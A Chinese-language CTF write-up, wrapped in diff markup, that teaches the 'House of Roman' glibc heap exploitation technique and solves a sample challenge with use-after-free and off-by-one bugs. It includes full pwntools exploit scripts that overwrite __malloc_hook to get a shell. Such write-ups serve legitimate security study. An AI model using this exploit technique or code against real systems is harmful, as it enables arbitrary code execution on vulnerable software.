@@ -1,0 +1,185 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="77bc91402ce0f6084c85328468b9df47">House of roman</h1>
+<p>这个利用方式目前在2.23到2.29之间是可以利用的，而且对于漏洞点要求不高，主要是uaf和overflow（有一个uaf即可），在可以创建任意大小的堆块的情况下，不泄露出堆地址的情况下面，通过爆破（12bit也就是4096分之一），来getshell</p>
+<p>House of Roman 的一个核心思路就是利用局部写减少随机化的程度，从而给出爆破的可能</p>
+<h2 data-content="1" id="3823be54816912f46b309fc7b9402f50">原理解析（poc）</h2>
+<p>说是一种house of，但是其实本质上没有涉及什么新的东西，只是一种fastbin和unsortedbin的结合利用而已，攻击大致分为三个阶段:</p>
+<ol>
+<li>通过低位地址改写使 fastbin chunk 的 fd 指针指向 __malloc_hook.</li>
+<li>通过 unsortedbin attack 把 main_arena 写到 malloc_hook 上.</li>
+<li>通过低位地址修改 __malloc_hook 为 one_gadget.</li>
+</ol>
+<p>我们先申请四个堆块</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729112911-b8abb46c-4d5a-1.png"/></p>
+<p>从上往下，依次为1,2,3,4，我们先free掉第三个堆块，这个时候，3号堆块会放进unsortedbin里面</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729112926-c1eec316-4d5a-1.png"/></p>
+<p>我们再申请一个0x60大小的堆块，这个时候会从3号堆块里面切割除来，我们申请的这个堆块里面就有main_arena的地址了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729112941-cac3f664-4d5a-1.png"/></p>
+<p>然后就可以通过main_arena的地址，计算出malloc_hook的地址了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729112953-d21d2dea-4d5a-1.png"/></p>
+<p>其实可以发现，他们只有末三位不同，而末三位都是固定的，所以可以得到malloc_hook的地址</p>
+<p>我们接着再释放4和1，这个时候链表是fastbin 0x70 -&gt; chunk1 -&gt; chunk4</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729113007-d9ebe8ae-4d5a-1.png"/></p>
+<p>如果我们修改chunk1的fd指针，修改最后一个字节为00，这个链表就会变成chunk1 -&gt; chunk3_1 -&gt; chunk3_1 的 fd（chunk3_1）就是刚刚从3号堆块里面拆出来的那个0x60大小的堆块</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729113023-e3eb3cd8-4d5a-1.png"/></p>
+<p>也就是这样，chunk3_1 的 fd 是我们可以修改掉的，通过修改后几位，将其改为malloc_hook - 0x23，接下来连续 malloc 两次，把 fastbin 中的 chunk malloc回去，再次 malloc 就能拿到一个指 malloc_hook 附近的 chunk</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729113038-ecb3353c-4d5a-1.png"/></p>
+<p>像这样，那我们再次申请0x60堆块的时候，就可以申请到这里，但是在真正的漏洞利用中，由于 malloc_hook 的最后半字节是随机的,需要爆破</p>
+<p>第二步：Unsorted_bin attack，使我们能够将较大的值写入任意位置。 这个较大的值为 main_arena + 0x68。 我们通过 unsorted bin attack 把 malloc_hook 写为 unsortedbin 的地址，这样只需要改低几个字节就可以把malloc_hook 改为 system 的地址了（而实际上，在2.29之后我们的Unsorted_bin attack就失效了，所以我们再2.29之后Roman也失效了）</p>
+<p>我们申请一个0x80，一个0x30的堆块（这个是防止和top chunk合并的），准备进行unsortedbin_attack，</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729113101-fa1d9ac8-4d5a-1.png"/></p>
+<p>我们free掉这个0x90的堆块，放入unsortedbin里面，然后覆盖当前堆块的fd末字节使得 bk 为 __malloc_hook-0x10</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729113115-027e49c4-4d5b-1.png"/></p>
+<p>再申请回来，完成攻击</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729113127-099cc136-4d5b-1.png"/></p>
+<p>可以看到，我们的main_arena地址写进了mallooc_hook</p>
+<p>我们只要修改末尾几个字节，改成one_gadget或者system函数就可以getshell</p>
+<h2 data-content="1" id="bf0f0558e5970a1d44f166d5a90485df">例题</h2>
+<p>我们先来分析一下程序</p>
+<p>看一下保护</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729113138-107dd86e-4d5b-1.png"/></p>
+<h3 data-content="1" id="eb75e1f9c7b653376499aa8e5e3c1cfe">主函数部分</h3>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729113151-17f6a90e-4d5b-1.png"/></p>
+<p>menu和初始化就不放了，glibc版本是2.23，主函数只有三个部分，add，edit和free，没有show函数，所以这也就意味着我们没有办法泄露libc（而实际上可以利用io，感兴趣的可以看我另一篇讲stdout的文章）</p>
+<h3 data-content="1" id="ec486ac118a50550969e3a7d280da320">add函数</h3>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729113202-1ec383b0-4d5b-1.png"/></p>
+<p>可以申请任意大小的堆块，最多19个，没有什么漏洞</p>
+<h3 data-content="1" id="3e45bd3aca6e293174eb2dbf51a2b47f">edit函数</h3>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729113218-27fdf244-4d5b-1.png"/></p>
+<p>先输出idx，然后根据索引修改，这里有一个很明显的off by one漏洞</p>
+<h3 data-content="1" id="0a1a29c8579c13970a678bb999f2f3ad">delete函数</h3>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729113230-2fb88d00-4d5b-1.png"/></p>
+<p>有一个uaf漏洞，然后就没有什么了</p>
+<h3 data-content="1" id="df5e7f9f9ef2848eaa5bb9f682f750da">exp编写</h3>
+<p>在不考虑io利用的情况下，这一题毫无疑问是很标准的house of roman，通过fastbin attack + unsortedbin attack来减少爆破概率</p>
+<p>我们来看看exp怎么编写</p>
+<p>先创建四个堆块，大小分别为0x60,0x80,0x80,0x60，编号为0,1,2,3，free掉第三个堆块，也就是2号</p>
+<p>这样二号堆块会被放进unsortedbin里面</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">'libc-2.23.so'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">"b *$rebase(0xaff)"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">':'</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">':'</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"3"</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">':'</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"2"</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">':'</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">':'</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="c1">#这里只能用send，不然会影响部分改</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">'aaaa'</span><span class="p">)</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">dbg</span><span class="p">()</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729113250-3b48c306-4d5b-1.png"/></p>
+<p>然后我们申请一个0x60大小的堆块，这样会从2号堆块里面切割出来带有mian_arena地址的堆块</p>
+<p>再释放3和0，使得fastbin链表里面存有数据</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729113309-46a89d16-4d5b-1.png"/></p>
+<p>我们修改chunk0的fd指针，修改最后一个字节为00，这个链表就会变成chunk0 -&gt; chunk2_1 ，也就是从二号堆块里面拆除来的那个输出fastbin的堆块</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729113323-4ebbf980-4d5b-1.png"/></p>
+<p>可以看到，我们成功修改了指针，再申请两次就能申请到main_arena的位置了，如果我们再修改从二号堆块里面拆出来的这个堆块（也就是4号）的末尾指针，指向malloc_hook-0x23，就能只能填入system的地址，再getshell</p>
+<div class="highlight"><pre><span></span><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="n">p16</span><span class="p">(</span><span class="mh">0x3aed</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span>
+</pre></div>
+<p>直接修改指针到malloc_hook-0x23（我本地关了aslr，所以就直接改了）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729113340-58ef6ca2-4d5b-1.png"/></p>
+<p>可以看到，再申请一次就能改malloc_hook了</p>
+<p>但是现在还有一个问题，因为没有泄露libc，所以不能直接改malloc为onegadget或者system的，也就是现在要再利用一次unsortedbin attack，把malloc_hook改掉，改成libc里面的数据，这里改的就是main_arena</p>
+<p>申请两个堆块，一个0x80，一个0x30（防止合并），释放0x80，改bk指针为malloc-0x10</p>
+<p>再申请回来，完成攻击</p>
+<div class="highlight"><pre><span></span><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">7</span><span class="p">)</span><span class="c1">#malloc_hook-0x23</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span><span class="mi">9</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="mi">10</span><span class="p">)</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729113407-691100a0-4d5b-1.png"/></p>
+<p>可以看到，我们完成了修改，再之后就是爆破了，因为最后三位固定，只有前三位要改，4096分之一的概率</p>
+<p>我这里就不爆破了，概率确实有点感人了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240729113422-723c4464-4d5b-1.png"/></p>
+<p>可以看到，我们已经把malloc_hook改成system了(偷个懒，不想找onegadget了)</p>
+<p>那这道题就可以被我们getshell，在没有show的情况下，最后放一下除了修改one_gadget的完整exp</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">'libc-2.23.so'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">"b *$rebase(0xaff)"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">':'</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">':'</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"3"</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">':'</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"2"</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">':'</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">':'</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">'aaaa'</span><span class="p">)</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="n">p16</span><span class="p">(</span><span class="mh">0x3aed</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">7</span><span class="p">)</span><span class="c1">#malloc_hook-0x23</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span><span class="mi">9</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="mi">10</span><span class="p">)</span><span class="c1">#unsortedbin attack</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x13</span><span class="o">+</span><span class="n">p16</span><span class="p">(</span><span class="mh">0x5380</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x84</span><span class="p">))</span><span class="c1">#改成onegadget</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="mi">10</span><span class="p">)</span>
+<span class="n">dbg</span><span class="p">()</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+</div>
